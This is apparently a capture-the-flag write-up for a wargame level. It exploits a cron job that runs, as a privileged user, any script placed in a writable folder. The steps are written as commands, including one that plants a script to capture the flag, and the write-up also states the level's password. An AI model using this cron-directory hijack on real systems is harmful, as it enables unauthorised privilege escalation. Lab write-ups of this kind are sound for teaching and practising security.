# Level 05

## Password
> ne2searoevaevoem4ov4ar8ap

## Steps
1. ```cat /var/mail/level05```\
```*/2 * * * * su -c "sh /usr/sbin/openarenaserver"``` - flag05 <br/>
It looks like a crontab directive, ```/usr/sbin/openarenaserver``` seems to be executed every 2 minutes
2. ```cat /usr/sbin/openarenaserver```\
This script executes every script in the ```/opt/openarenaserver``` folder before deleting them
3. ```echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit.sh```
4. Wait 2 minutes, then ```cat /tmp/flag```